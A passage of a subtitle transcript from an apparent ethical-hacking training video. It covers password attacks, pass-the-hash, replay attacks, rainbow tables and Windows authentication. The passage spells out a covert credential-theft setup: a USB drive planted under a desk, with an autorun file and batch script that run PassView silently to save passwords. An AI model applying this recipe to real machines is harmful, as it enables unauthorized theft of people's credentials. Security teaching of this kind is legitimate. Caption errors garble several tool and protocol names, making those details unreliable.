next one.\n\n501\n00:22:03.140 --> 00:22:05.620\nAnd then pretty soon,\nyou solve enough of them and\n\n502\n00:22:05.620 --> 00:22:08.920\nyou figure out how to stop that\nissue from being a major problem.\n\n503\n00:22:08.920 --> 00:22:11.000\nBut untill then,\nyou just gotta keep hacking away it.\n\n504\n00:22:11.000 --> 00:22:11.617\nNo pun intended.\n\n505\n00:22:11.617 --> 00:22:12.160\n>> [LAUGH]\n>> Right, but\n\n506\n00:22:12.160 --> 00:22:14.360\nyou gotta keep hacking away\nat it to get it right.\n\n507\n00:22:14.360 --> 00:22:15.150\nI mean, this can take time.\n\n508\n00:22:15.150 --> 00:22:18.230\nThis is not something you do one time and\nboom you're done, right?\n\n509\n00:22:18.230 --> 00:22:19.595\nSo, what I wanna do is\ngive you a practical,\n\n510\n00:22:19.595 --> 00:22:23.600\nreal-world example of how we may\nuse a password hacking tool right.\n\n511\n00:22:23.600 --> 00:22:27.100\nEssentially a keyword logger to be able\nto capture stuff behind the scenes.\n\n512\n00:22:27.100 --> 00:22:29.510\nNow I asked Mike to see if he\ncould find this piece of software.\n\n513\n00:22:29.510 --> 00:22:30.690\nHe wasn't able to find it.\n\n514\n00:22:30.690 --> 00:22:32.810\nWe got a bunch of conflicting\nstuff that came up.\n\n515\n00:22:32.810 --> 00:22:35.350\nI know you can download it out there we'll\nhave to see if we can find it for you and\n\n516\n00:22:35.350 --> 00:22:36.320\ntell you where to get it.\n\n517\n00:22:36.320 --> 00:22:38.780\nBut a tool called Passview is\none of the tools we can use,\n\n518\n00:22:38.780 --> 00:22:42.900\nso, Meghan can we flip over to my\ndemo machine here for just a second.\n\n519\n00:22:42.900 --> 00:22:47.170\nSo what I want to do is just quickly\nnarrate for you what we can do to do\n\n520\n00:22:47.170 --> 00:22:52.230\nessentially, or rather create essentially,\nthe ability for\n\n521\n00:22:52.230 --> 00:22:55.830\nus to download this piece of software,\nstick it on a USB drive or any\n\n522\n00:22:55.830 --> 00:23:01.110\ninnocuous piece of transmission medium,\nplug it into an unsuspecting machine.\n\n523\n00:23:01.110 --> 00:23:06.390\nHave it essentially go out and\nthen either pop up an auto run,\n\n524\n00:23:06.390 --> 00:23:09.100\nor we can even hide the auto run and\nexecute it, and then it's gonna run in\n\n525\n00:23:09.100 --> 00:23:12.040\nthe background and it's gonna\ncapture all these passwords, right?\n\n526\n00:23:12.040 --> 00:23:14.480\nSo the idea is we'll download\nthis piece of software and\n\n527\n00:23:14.480 --> 00:23:16.510\nthen we'll be able to execute\nit in the background and\n\n528\n00:23:16.510 --> 00:23:21.080\nstore them, store the captured passwords,\nin a text file on the USB device.\n\n529\n00:23:21.080 --> 00:23:23.960\nSo let's pretend that we put\nthis in the back of a machine,\n\n530\n00:23:23.960 --> 00:23:25.480\ncrammed up under somebody's desk.\n\n531\n00:23:25.480 --> 00:23:28.870\nCuz, you know, a lot of times in these\ncube farms, you got machines there.\n\n532\n00:23:28.870 --> 00:23:32.310\nNobody bothers to crawl under there and\nlook at what's going on, right?\n\n533\n00:23:32.310 --> 00:23:33.190\nSo would it be hard for\n\n534\n00:23:33.190 --> 00:23:35.570\nus to stick a USB drive in\nthe back of one of those machines?\n\n535\n00:23:35.570 --> 00:23:37.400\nIf we've got physical access?\n\n536\n00:23:37.400 --> 00:23:39.950\nAnd leave it there and\ncome back and get it a week later?\n\n537\n00:23:39.950 --> 00:23:41.960\nNo, probably not that hard at all, right?\n\n538\n00:23:41.960 --> 00:23:45.190\nEspecially if we inserted\nourselves onto the cleaning\n\n539\n00:23:45.190 --> 00:23:49.220\ncrew of that particular organisation,\nbecause it's part of an extended pen test,\n\n540\n00:23:49.220 --> 00:23:51.380\nwe're walking around\nlooking at stuff inside.\n\n541\n00:23:51.380 --> 00:23:53.800\nMay not be hard at all at night,\nnobody's gonna bother us.\n\n542\n00:23:53.800 --> 00:23:56.930\nCleaning people do crawl under desks,\nthat's one of things they do to clean.\n\n543\n00:23:56.930 --> 00:24:00.628\nWould it be unusual to see somebody on\na video replay on a CCTV under there for\n\n544\n00:24:00.628 --> 00:24:03.462\na minute looking like they're\nstraightening stuff up?\n\n545\n00:24:03.462 --> 00:24:04.813\nYou wouldn't think twice about that.\n\n546\n00:24:04.813 --> 00:24:09.027\nBut they are planting or then removing\na USB device to capture this information.\n\n547\n00:24:09.027 --> 00:24:10.759\nSneaky and insidious we are.\n\n548\n00:24:10.759 --> 00:24:11.461\nRight?\n\n549\n00:24:11.461 --> 00:24:12.590\n>> We are.\n>> So we're gonna download this.\n\n550\n00:24:12.590 --> 00:24:13.352\nWe're gonna put it in there.\n\n551\n00:24:13.352 --> 00:24:16.007\nWe're gonna download pass view,\nwhich is a password hacking tool.\n\n552\n00:24:16.007 --> 00:24:18.670\nThere are many versions you\ncan do all sorts at once.\n\n553\n00:24:18.670 --> 00:24:21.320\nWe'll copy the downloaded\nfile onto the USB drive.\n\n554\n00:24:21.320 --> 00:24:23.180\nWe'll then go ahead and\ncreate an honor run file.\n\n555\n00:24:23.180 --> 00:24:28.590\nSo what I did here was I talked about\nhow to create that autorun inf file.\n\n556\n00:24:28.590 --> 00:24:31.400\nWe would essentially just\ncreate a file with two entries.\n\n557\n00:24:31.400 --> 00:24:33.215\nAutorun and then en equals.\n\n558\n00:24:33.215 --> 00:24:35.010\nLaunch.bat, right.\n\n559\n00:24:35.010 --> 00:24:37.605\nSo then what we would do is\ncreate a launch.bat file.\n\n560\n00:24:37.605 --> 00:24:39.940\nSo launch.bat would be a separate file.\n\n561\n00:24:39.940 --> 00:24:43.880\nAgain a text file, just with a .bat\nextension, and two lines, right.\n\n562\n00:24:43.880 --> 00:24:46.570\nStart the pass view software.\n\n563\n00:24:46.570 --> 00:24:48.352\nSo whatever the executable is,\n\n564\n00:24:48.352 --> 00:24:52.382\npspv.exe is the has to be executable for\npass view, but whatever it is.\n\n565\n00:24:52.382 --> 00:24:54.820\nWith whatever switches that they have.\n\n566\n00:24:54.820 --> 00:24:57.556\nIn this case, slash s to save to text.\n\n567\n00:24:57.556 --> 00:25:00.770\nSo /stext would be the switch\nwe would use there.\n\n568\n00:25:00.770 --> 00:25:02.725\nThen we would go ahead and say.\n\n569\n00:25:02.725 --> 00:25:03.652\nWhat is the output file?\n\n570\n00:25:03.652 --> 00:25:04.579\nIn other words, we have to tell it.\n\n571\n00:25:04.579 --> 00:25:08.051\nIn this case specific to this software,\nwhere do we output it.\n\n572\n00:25:08.051 --> 00:25:10.684\npspv.txt create up pspv.txt file or\n\n573\n00:25:10.684 --> 00:25:14.976\nwhatever you wanna call it\nhalfpasswords.txt or whatever.\n\n574\n00:25:14.976 --> 00:25:16.842\nYou don't have to get creative,\nkeep it simple.\n\n575\n00:25:16.842 --> 00:25:21.520\nAnd then we'll just put this usb\ndrive into the target machine.\n\n576\n00:25:21.520 --> 00:25:23.084\nProbably get an auto run pop up.\n\n577\n00:25:23.084 --> 00:25:25.839\nExecute the software, walk away.\n\n578\n00:25:25.839 --> 00:25:29.030\nIt's running in the background,\nriding to that usb device.\n\n579\n00:25:29.030 --> 00:25:30.040\nNobody knows it's there.\n\n580\n00:25:30.040 --> 00:25:31.690\nIt's essentially a key lock, right?\n\n581\n00:25:31.690 --> 00:25:33.340\nIt's gonna capture everything.\n\n582\n00:25:33.340 --> 00:25:35.820\nSo, we could do something like this,\npretty straightforward.\n\n583\n00:25:35.820 --> 00:25:37.800\nPretty easy to do relatively speaking.\n\n584\n00:25:37.800 --> 00:25:39.430\nSecret that into a system.\n\n585\n00:25:39.430 --> 00:25:42.330\nAnd essentially,\nwe're off to the races, right?\n\n586\n00:25:42.330 --> 00:25:43.690\nSo, we can come on back, if you'd like.\n\n587\n00:25:43.690 --> 00:25:44.430\nThat's fine.\n\n588\n00:25:44.430 --> 00:25:46.180\nAnd so the reality is, right.\n\n589\n00:25:46.180 --> 00:25:49.070\nThat we're gonna be able to do\nsomething like this if we can get\n\n590\n00:25:49.070 --> 00:25:50.410\nphysical proximity access.\n\n591\n00:25:50.410 --> 00:25:51.510\nNow, is it hard?\n\n592\n00:25:51.510 --> 00:25:52.555\nTo get into someone's system.\n\n593\n00:25:52.555 --> 00:25:55.970\nIs it hard to get up close and\npersonal with their machine?\n\n594\n00:25:55.970 --> 00:25:58.420\nIs it hard to plug USB drive\nin without being noticed?\n\n595\n00:25:58.420 --> 00:25:59.030\nYeah, it is.\n\n596\n00:25:59.030 --> 00:26:00.560\nI'm not suggesting it will be easy.\n\n597\n00:26:00.560 --> 00:26:02.590\nBut I've given you one example how\nyou might do this without being\n\n598\n00:26:02.590 --> 00:26:04.160\nchallenged at all.\n\n599\n00:26:04.160 --> 00:26:07.550\nSo keep in mind if I'm a vendor and\nI come on site and\n\n600\n00:26:07.550 --> 00:26:09.502\nI'm walking around servicing machines.\n\n601\n00:26:09.502 --> 00:26:12.681\nOr I'm in the data center, and\nI'm in and out of the cage.\n\n602\n00:26:12.681 --> 00:26:15.581\nWould it be hard for me to slip this\non to a machine and have it executed?\n\n603\n00:26:15.581 --> 00:26:16.920\nAnd maybe leave it there?\n\n604\n00:26:16.920 --> 00:26:19.072\nMay or may not be found,\nit is hard to say.\n\n605\n00:26:19.072 --> 00:26:20.620\nWhat about your photocopy vendor.\n\n606\n00:26:20.620 --> 00:26:24.166\nThat comes in, replaces toner cartridges,\nand fixes the photocopier,\n\n607\n00:26:24.166 --> 00:26:26.740\nthe network printer,\nthe all-in-one device.\n\n608\n00:26:26.740 --> 00:26:29.390\nYou know, there is an on board\nhard drive on that thing, right?\n\n609\n00:26:29.390 --> 00:26:32.510\nTypically, would it be hard for\nthem to compromise that system?\n\n610\n00:26:32.510 --> 00:26:33.540\nProbably wouldn't be all that hard.\n\n611\n00:26:33.540 --> 00:26:36.660\nAnd it wouldn't be hard for\na hacker to get one of these jobs.\n\n612\n00:26:36.660 --> 00:26:39.800\nIf they're looking to compromise you and\ntarget you specifically.\n\n613\n00:26:39.800 --> 00:26:41.583\nIf they wanted to for a couple of weeks.\n\n614\n00:26:41.583 --> 00:26:42.779\nAnd again, I'm not saying it's easy.\n\n615\n00:26:42.779 --> 00:26:45.128\nBut I'm just pointing out that\nit's not beyond the pale.\n\n616\n00:26:45.128 --> 00:26:48.060\nIt's not unreasonable to\nassume that this may happen.\n\n617\n00:26:48.060 --> 00:26:49.910\nAll right, so this is some of\nthe stuff you want to think about.\n\n618\n00:26:49.910 --> 00:26:51.810\nWhat about hash injection attacks?\n\n619\n00:26:51.810 --> 00:26:56.130\nAnother active online attack vector\nwe often have to worry about.\n\n620\n00:26:56.130 --> 00:26:59.290\nVersus wire sniffing,\nwhich would be a passive online attack.\n\n621\n00:26:59.290 --> 00:27:01.180\nSo let's think about going active for\na minute, right?\n\n622\n00:27:01.180 --> 00:27:02.816\nWhen I talk about hash injection attacks.\n\n623\n00:27:02.816 --> 00:27:03.465\nWhat comes to your mind?\n\n624\n00:27:03.465 --> 00:27:07.689\nWhat are you thinking would be something\nwe may be thinking about that would\n\n625\n00:27:07.689 --> 00:27:08.720\nhappen here.\n\n626\n00:27:08.720 --> 00:27:11.630\n>> Looks like we're gonna try\nsend some hash values and\n\n627\n00:27:11.630 --> 00:27:14.080\nhopefully they will let us authenticate?\n\n628\n00:27:14.080 --> 00:27:15.530\n>> Essentially that, exactly right.\n\n629\n00:27:15.530 --> 00:27:20.140\nSo what Mike's describing is we're gonna\ntry to spoof an identity by sending a hash\n\n630\n00:27:20.140 --> 00:27:23.740\nthat we may captured from a prior\npassive sniffing session, right?\n\n631\n00:27:23.740 --> 00:27:27.940\nSo we may pair passive online and\nactive online attacks together.\n\n632\n00:27:27.940 --> 00:27:30.730\nCuz we're probably gonna do a little\nsniffing, capture some hashes.\n\n633\n00:27:30.730 --> 00:27:32.140\nWe already talked about\nhow we could do that.\n\n634\n00:27:32.140 --> 00:27:34.908\nWhat we would do with rainbow tables,\nknowing what that is.\n\n635\n00:27:34.908 --> 00:27:39.230\nWe then may be able to inject those\nhashes into a transmission stream.\n\n636\n00:27:39.230 --> 00:27:41.083\nWhere we allow the attacker right,\n\n637\n00:27:41.083 --> 00:27:44.810\nto able to essentially assume\nthe identity of that person, right?\n\n638\n00:27:44.810 --> 00:27:48.670\nTrying to see if they can become validated\nto a network resource by saying.\n\n639\n00:27:48.670 --> 00:27:49.690\nNo, I am Mike.\n\n640\n00:27:49.690 --> 00:27:50.282\nHere's my ID.\n\n641\n00:27:50.282 --> 00:27:51.960\nRight, cuz remember we send the hash.\n\n642\n00:27:51.960 --> 00:27:53.600\nWe don't actually send Mike's password.\n\n643\n00:27:53.600 --> 00:27:54.894\nWe send a representation of it.\n\n644\n00:27:54.894 --> 00:27:57.170\nIf we could find that information.\n\n645\n00:27:57.170 --> 00:27:59.636\nSend it across the wire.\n\n646\n00:27:59.636 --> 00:28:02.971\nWe can then use that to try to\nauthenticate at the domain controller,\n\n647\n00:28:02.971 --> 00:28:06.390\ntry to authenticate to a local resource,\nif it's a work group.\n\n648\n00:28:06.390 --> 00:28:09.420\nAnd then we may be able to gain access\nto whatever resources are there.\n\n649\n00:28:09.420 --> 00:28:13.660\nSo we can inject the hash and essentially\nspoof the identity by doing that.\n\n650\n00:28:13.660 --> 00:28:15.380\nThat would be another way potentially.\n\n651\n00:28:15.380 --> 00:28:18.320\nAgain, you'd have to already be\nin the system, be in the network.\n\n652\n00:28:18.320 --> 00:28:20.330\nOr, we talk a lot about insider attacks.\n\n653\n00:28:20.330 --> 00:28:23.170\nAnd the fact that you know\ninsiders may be up to no good.\n\n654\n00:28:23.170 --> 00:28:27.180\nThey may have rights as an authenticated\nuser, but may not have admin rights.\n\n655\n00:28:27.180 --> 00:28:28.910\nWhat if they snoop the hashes.\n\n656\n00:28:28.910 --> 00:28:29.920\nSniff them on the wire.\n\n657\n00:28:29.920 --> 00:28:31.925\nFigure out what the admin account is.\n\n658\n00:28:31.925 --> 00:28:33.229\nGet the hash for that.\n\n659\n00:28:33.229 --> 00:28:37.588\nAnd then they take that and they try to\npropagate that to a privilege escalation\n\n660\n00:28:37.588 --> 00:28:40.210\nattack through a hash injection.\n\n661\n00:28:40.210 --> 00:28:42.450\nThat would actually lead to a compromise.\n\n662\n00:28:42.450 --> 00:28:46.320\nAnd that's what a bad actor and/or what an\nethical hacker on the flipside has to be\n\n663\n00:28:46.320 --> 00:28:48.250\naware of to try to defend against.\n\n664\n00:28:48.250 --> 00:28:50.448\nI'm tired I think I want to go home\nwe're doing a lot of hard work here.\n\n665\n00:28:50.448 --> 00:28:52.177\n>> [LAUGH]\n>> This is one of those particular\n\n666\n00:28:52.177 --> 00:28:55.172\ntopics where we actually have\nto get up and do something.\n\n667\n00:28:55.172 --> 00:28:55.792\n>> I know.\n\n668\n00:28:55.792 --> 00:28:58.850\n>> Right, a little CEH aerobics.\n\n669\n00:28:58.850 --> 00:29:02.490\nI'm hacking and checking hashes and\nall sorts of crazy stuff right.\n\n670\n00:29:02.490 --> 00:29:03.954\nWhat about man-in-the-middle and\nreplay attacks?\n\n671\n00:29:03.954 --> 00:29:06.540\nAgain, same kinda thing.\n\n672\n00:29:06.540 --> 00:29:10.332\nWe can either pass all traffic\nthrough a known choke point.\n\n673\n00:29:10.332 --> 00:29:12.150\nEssentially grab the traffic, hold it.\n\n674\n00:29:12.150 --> 00:29:14.510\nAnd then pretend to be somebody\nby going off and saying.\n\n675\n00:29:14.510 --> 00:29:17.519\nNo, I'm really this person,\nman-in-the-middle, or\n\n676\n00:29:17.519 --> 00:29:18.850\nwe can do a replay attack.\n\n677\n00:29:18.850 --> 00:29:23.119\nThis is a session compromise\nwhere we knock somebody offline.\n\n678\n00:29:23.119 --> 00:29:27.320\nAnd then try to propagate their session\nforward by picking it back up again.\n\n679\n00:29:27.320 --> 00:29:29.010\nHoping we don't have to authenticate.\n\n680\n00:29:29.010 --> 00:29:30.690\nBecause since the session was knocked off.\n\n681\n00:29:30.690 --> 00:29:33.710\nWe can just simply pick back up,\nand the system thinks it's us.\n\n682\n00:29:33.710 --> 00:29:38.390\nNow we know, and we've learned over\nthe years that this is not good behavior.\n\n683\n00:29:38.390 --> 00:29:40.980\nWe know, and I'm always shocked when\nI see websites that still do this.\n\n684\n00:29:40.980 --> 00:29:43.890\nAnd I'm shocked at some of the vendors\nwebsites that do this cuz it\n\n685\n00:29:43.890 --> 00:29:47.585\nhappened to me last night with certain\nsystem, which will rename nameless.\n\n686\n00:29:47.585 --> 00:29:50.770\nCuz it's a major vendor,\nI don't want to embarrass them.\n\n687\n00:29:50.770 --> 00:29:54.070\nBut, you know, the reality is,\nthat this is fairly common today.\n\n688\n00:29:54.070 --> 00:29:56.238\nAnd you would think that we\nhave learned our lesson right?\n\n689\n00:29:56.238 --> 00:29:58.750\nBut the reality is more and\nmore vendors are learning.\n\n690\n00:29:58.750 --> 00:30:01.629\nAnd more and\nmore vendors are using anti-replay and\n\n691\n00:30:01.629 --> 00:30:06.650\nsingle session token technology to prevent\nand essentially prevent replay attacks.\n\n692\n00:30:06.650 --> 00:30:09.440\nSingle session tokens and\nanti-replay technology\n\n693\n00:30:09.440 --> 00:30:12.610\nallow you to authenticate one time and\nattach a session token.\n\n694\n00:30:12.610 --> 00:30:14.740\nYou need an identifier of\nsome kind to your session.\n\n695\n00:30:14.740 --> 00:30:17.934\nIf you get knocked off, you get\ncompromised, session closes, whatever.\n\n696\n00:30:17.934 --> 00:30:19.251\nYou come back you gotta re-authenticate.\n\n697\n00:30:19.251 --> 00:30:20.732\nThat session token is no longer valid.\n\n698\n00:30:20.732 --> 00:30:24.071\nThat ID is no longer allowed\nto open up a new session.\n\n699\n00:30:24.071 --> 00:30:27.225\nThis had been going on for\nyears in the financial services industry.\n\n700\n00:30:27.225 --> 00:30:28.990\nCuz banks got wise to this a while ago.\n\n701\n00:30:28.990 --> 00:30:31.535\nAnd said,\nhey we can't allow people to reconnect.\n\n702\n00:30:31.535 --> 00:30:32.850\nCuz we're getting nailed for\n\n703\n00:30:32.850 --> 00:30:35.390\nfraud, because people are just\nknocking those connections off.\n\n704\n00:30:35.390 --> 00:30:38.300\nAnd bad actors are coming and\ntaking over the session and\n\n705\n00:30:38.300 --> 00:30:39.900\ntaking the money out of the account.\n\n706\n00:30:39.900 --> 00:30:43.130\nSo they went to an anti-replay\nstrategy that involves single use, or\n\n707\n00:30:43.130 --> 00:30:44.470\nsingle session tokens.\n\n708\n00:30:44.470 --> 00:30:45.800\nGreat way to prevent against that.\n\n709\n00:30:45.800 --> 00:30:48.980\nGreat compromise protection in\nterms of countermeasures, right.\n\n710\n00:30:48.980 --> 00:30:51.120\nSo we want to think about that and\nknow about that.\n\n711\n00:30:51.120 --> 00:30:52.564\nWe've talked about rainbow tables and\nthe importance of the rainbow table.\n\n712\n00:30:52.564 --> 00:30:54.767\nAnd how that's gonna work.\n\n713\n00:30:54.767 --> 00:30:58.360\nAnd we've talked about why that is so\nimportant.\n\n714\n00:30:58.360 --> 00:31:00.300\nWe can create our own\nrainbow tables by the way.\n\n715\n00:31:00.300 --> 00:31:04.050\nI do this sometimes when I have\na specific need to do this to, for\n\n716\n00:31:04.050 --> 00:31:06.740\na certain subgroup of users,\nor whatever we're looking at.\n\n717\n00:31:06.740 --> 00:31:09.340\nWe go in, and we're given some\ninformation we may create our own.\n\n718\n00:31:09.340 --> 00:31:11.510\nThere's a bunch of tools out\nthere that will let you do it.\n\n719\n00:31:11.510 --> 00:31:14.270\nThere's Artegen, there's Win-Artegen.\n\n720\n00:31:14.270 --> 00:31:16.760\nA bunch of others that\nare out there as well.\n\n721\n00:31:16.760 --> 00:31:20.400\nArtegen or Janisen or Win-Artegen.\n\n722\n00:31:20.400 --> 00:31:23.080\nYou can use either of those.\n\n723\n00:31:23.080 --> 00:31:26.290\nSo there's lots of different ways for\nus to be able to do this.\n\n724\n00:31:26.290 --> 00:31:27.668\nObviously get the value of it.\n\n725\n00:31:27.668 --> 00:31:29.452\nI'm a big believer in taking\nwhat's already been done.\n\n726\n00:31:29.452 --> 00:31:32.720\nYou're using the work\nvalue of somebody else.\n\n727\n00:31:32.720 --> 00:31:35.730\nIf they've gone to the trouble as we've\ntalked about in the discussion earlier.\n\n728\n00:31:35.730 --> 00:31:37.054\nI know Mike posted that link.\n\n729\n00:31:37.054 --> 00:31:40.040\nTo go to the trouble to create\nthose rainbow tables already.\n\n730\n00:31:40.040 --> 00:31:41.840\nI'm not gonna go reinvent the wheel.\n\n731\n00:31:41.840 --> 00:31:44.920\nBut the reality is I may want a very\nspecific set of rainbow tables.\n\n732\n00:31:44.920 --> 00:31:47.770\nThat are gonna be unique to\nthe network I'm working on.\n\n733\n00:31:47.770 --> 00:31:50.840\nAnd so, I may wanna go create them\nwith a specific hash algorithm.\n\n734\n00:31:50.840 --> 00:31:55.150\nSomebody may be using write MD-160 and\nI may not have that on a website.\n\n735\n00:31:55.150 --> 00:31:56.945\nI may have to go out and\nfind that all right.\n\n736\n00:31:56.945 --> 00:32:00.268\nOr they're using MD-5, but\nyou know I have RC-4 or\n\n737\n00:32:00.268 --> 00:32:03.024\nwhatever it is, and\nI have to go create that.\n\n738\n00:32:03.024 --> 00:32:06.531\nSo there are reasons why you may want to\nhave a piece of software that does that.\n\n739\n00:32:06.531 --> 00:32:07.857\nJust be aware of that.\n\n740\n00:32:07.857 --> 00:32:10.094\nWhen we think about authentication,\nwe're thinking about rainbow tables.\n\n741\n00:32:10.094 --> 00:32:13.297\nI talked about the fact we pass hashes\nback and forth, not traditionally\n\n742\n00:32:13.297 --> 00:32:16.570\nuser names and passwords, but\ncryptographic representations of them.\n\n743\n00:32:17.680 --> 00:32:20.145\nWe want to keep in mind that\nin Windows in particular,\n\n744\n00:32:20.145 --> 00:32:23.235\nthere are different authentication methods\nthat are used depending on how old that\n\n745\n00:32:23.235 --> 00:32:24.595\noperating system is right.\n\n746\n00:32:24.595 --> 00:32:25.929\nWe have the SAM,\nSecurity Accounts Management database.\n\n747\n00:32:25.929 --> 00:32:29.845\nIt's called the SAM Hive,\nwhere we store that information.\n\n748\n00:32:29.845 --> 00:32:33.877\nThis is where we store the active\ndirectory information for that user.\n\n749\n00:32:33.877 --> 00:32:38.427\nIt is going to be storing that not in the\nclear, but as we talked about as a hash.\n\n750\n00:32:38.427 --> 00:32:39.927\nSo, we know that natively for\n\n751\n00:32:39.927 --> 00:32:43.877\nsome time now Microsoft has stored that\ninformation in that hashed format.\n\n752\n00:32:43.877 --> 00:32:45.357\nWe know that in earlier versions and\n\n753\n00:32:45.357 --> 00:32:47.830\neven some modern versions, and\nin many versions of Linux.\n\n754\n00:32:47.830 --> 00:32:50.820\nYou have a password file, but you also\nhave an Shadow file that you could\n\n755\n00:32:50.820 --> 00:32:54.510\nessentially enable and use to\ncryptographic protect those passwords, so\n\n756\n00:32:54.510 --> 00:32:57.050\nwe have that option in Linux as well and\nyou should be aware of that.\n\n757\n00:32:57.050 --> 00:32:58.060\nHopefully you are.\n\n758\n00:32:58.060 --> 00:32:59.440\nIf not, ding, ding, ding, right.\n\n759\n00:32:59.440 --> 00:33:02.180\nNew information, very important for\nyou to use and be aware of.\n\n760\n00:33:02.180 --> 00:33:05.440\nBut we have the authentication of windows.\n\n761\n00:33:05.440 --> 00:33:09.980\nWe also have authentication, in most\nmodern newer windows operating systems,\n\n762\n00:33:09.980 --> 00:33:12.411\nsince windows 2000,\nthe advent of the active directory.\n\n763\n00:33:12.411 --> 00:33:14.661\nThank you I didn't just say that but\nI really did.\n\n764\n00:33:14.661 --> 00:33:18.750\nBut we did borrow it, we did tell\npeople we did it, but we did borrow it.\n\n765\n00:33:18.750 --> 00:33:22.030\nFrom Novell, right because the directory\ntree was the directory tree there way\n\n766\n00:33:22.030 --> 00:33:23.430\nbefore it was our directory tree.\n\n767\n00:33:23.430 --> 00:33:24.500\nRemember the binary, by the way?\n\n768\n00:33:24.500 --> 00:33:25.685\n>> What?\n>> You remember the binary?\n\n769\n00:33:25.685 --> 00:33:26.650\n>> Uh-huh, yep.\n\n770\n00:33:26.650 --> 00:33:28.450\n>> The directory and that whole thing.\n\n771\n00:33:28.450 --> 00:33:30.030\nBanyan Vines and Street Talk.\n\n772\n00:33:30.030 --> 00:33:32.180\nI'm really dating myself\nby going back this far.\n\n773\n00:33:32.180 --> 00:33:32.750\n>> Yes, you are.\n\n774\n00:33:32.750 --> 00:33:34.050\n>> Did we ever talk about cocoNET?\n\n775\n00:33:34.050 --> 00:33:34.810\n>> We did not.\n\n776\n00:33:34.810 --> 00:33:36.860\n>> I think we actually\ndid one of our shows.\n\n777\n00:33:36.860 --> 00:33:41.510\nSo years ago, I was working with somebody\nsimilar to Mike, who I had this kind of\n\n778\n00:33:41.510 --> 00:33:43.880\nbanter and a relationship with,\nand I was teaching with.\n\n779\n00:33:43.880 --> 00:33:44.640\nAnd what we're doing.\n\n780\n00:33:44.640 --> 00:33:46.940\nWe used to teach banding vines and\nstreet talk classes.\n\n781\n00:33:46.940 --> 00:33:50.600\nand all this kind of stuff in Novell,\nyears and years ago.\n\n782\n00:33:50.600 --> 00:33:54.200\nAnd I came up with this idea for\na network and we called it cocoNET.\n\n783\n00:33:54.200 --> 00:33:56.940\nSo instead of banding vines and\nstreet talk, where you have, essentially,\n\n784\n00:33:56.940 --> 00:33:58.670\nthe beginnings of modern networks.\n\n785\n00:33:58.670 --> 00:34:01.200\nWe said, hey we would do this\nout of coconut shells and vines.\n\n786\n00:34:01.200 --> 00:34:02.987\n[LAUGH] and create out own network, right.\n\n787\n00:34:02.987 --> 00:34:05.220\nAnd you would have the cocoNET for\ntransmission, right.\n\n788\n00:34:05.220 --> 00:34:07.799\nAnd you'd be able to have the coconut\nshells on the far end of it.\n\n789\n00:34:07.799 --> 00:34:08.770\n>> Uh-huh.\n>> Talk in to and\n\n790\n00:34:08.770 --> 00:34:10.200\nyou'd be able to send back and forth.\n\n791\n00:34:10.200 --> 00:34:11.220\nSo we came up with coconut.\n\n792\n00:34:11.220 --> 00:34:11.840\nThat was our big thing.\n\n793\n00:34:11.840 --> 00:34:12.900\n>> Nice.\n>> That was our big thing.\n\n794\n00:34:12.900 --> 00:34:13.860\nThat was pretty cool.\n\n795\n00:34:13.860 --> 00:34:14.810\n>> And yet you're still working.\n\n796\n00:34:14.810 --> 00:34:16.340\nYou're not retired on your own island.\n\n797\n00:34:16.340 --> 00:34:16.840\n>> And yet here I am.\n\n798\n00:34:16.840 --> 00:34:20.530\nI am so dedicated to all of you out\nthere in the IT security community, and\n\n799\n00:34:20.530 --> 00:34:21.395\nhere at ITProTV for tv.\n\n800\n00:34:21.395 --> 00:34:26.345\nI have not retired even though I could\nnow because cocoNET, it was big.\n\n801\n00:34:26.345 --> 00:34:26.930\nIt was huge.\n\n802\n00:34:26.930 --> 00:34:29.035\n[LAUGH] In it's day it was big.\n\n803\n00:34:30.255 --> 00:34:32.065\nBut here we are anyway, right.\n\n804\n00:34:32.065 --> 00:34:33.515\nSo what can I tell you.\n\n805\n00:34:33.515 --> 00:34:37.580\nAnyway, keep in mind and\nbe aware of the fact that we have MTLM,\n\n806\n00:34:37.580 --> 00:34:39.950\nMT LAN Manager authentication.\n\n807\n00:34:39.950 --> 00:34:41.640\nEarlier versions of Windows, right?\n\n808\n00:34:41.640 --> 00:34:44.220\nWe use the MTLM or\nLM authentication protocols,\n\n809\n00:34:44.220 --> 00:34:46.095\nI think we showed this when\nwe did the rainbow teams.\n\n810\n00:34:46.095 --> 00:34:47.010\n>> Mm-hm.\n>> We had different\n\n811\n00:34:47.010 --> 00:34:48.540\nversions of the hashes.\n\n812\n00:34:48.540 --> 00:34:51.770\nThese protocols store users'\npasswords in the same database,\n\n813\n00:34:51.770 --> 00:34:54.690\nbut they use different hashing methods.\n\n814\n00:34:54.690 --> 00:34:58.320\nSo some hashes are created using\ndifferent kinds of techniques.\n\n815\n00:34:58.320 --> 00:34:59.040\nWe want to know that.\n\n816\n00:34:59.040 --> 00:35:03.310\nAnd then there's Kerberos, which is now\nthe default authentication solution,\n\n817\n00:35:03.310 --> 00:35:06.250\nby the way, where we have\na much stronger authentication.\n\n818\n00:35:06.250 --> 00:35:10.600\nThan NTLM hashes we're\nusing a ticketing system.\n\n819\n00:35:10.600 --> 00:35:13.420\nA ticket granting ticket and\na session ticket and\n\n820\n00:35:13.420 --> 00:35:17.017\nwe have the main server,\nthe KDC that's producing all this.\n\n821\n00:35:17.017 --> 00:35:20.080\nAnd so we have a whole different\nprocess that's taking place.\n\n822\n00:35:20.080 --> 00:35:24.250\nBut we want to know that prior to Windows\n2000, the active directory in Kerberos,\n\n823\n00:35:24.250 --> 00:35:29.410\nwe used NTLM as the primary method and\nwe still can use NTLM authentication for\n\n824\n00:35:29.410 --> 00:35:31.230\ninter wrapper ability and\nbackwards compatibility.\n\n825\n00:35:31.230 --> 00:35:34.490\nSo, we just want to know about that and\nunderstand different ways that Microsoft\n\n826\n00:35:34.490 --> 00:35:38.540\nspecifically is authenticating because\nthat does become important to us.\n\n827\n00:35:38.540 --> 00:35:40.120\nWe do want to make sure\nwe are aware of that.\n\n828\n00:35:40.120 --> 00:35:43.320\nWhen we think about the NTLM\nauthentication process,\n\n829\n00:35:43.320 --> 00:35:46.090\nwe're thinking about essentially\nrunning a hashing algorithm.\n\n830\n00:35:46.090 --> 00:35:49.840\nTaking username Joe,\npassword Joe1 hashing it.\n\n831\n00:35:49.840 --> 00:35:51.990\nGenerating a hash out the backend.\n\n832\n00:35:51.990 --> 00:35:56.320\nAnd then, I know we did this once for\neither CSIP or something.\n\n833\n00:35:56.320 --> 00:35:57.720\nand I asked you, hey,\ndo you have a hash calculator?\n\n834\n00:35:57.720 --> 00:35:58.705\nAnd you had something running.\n\n835\n00:35:58.705 --> 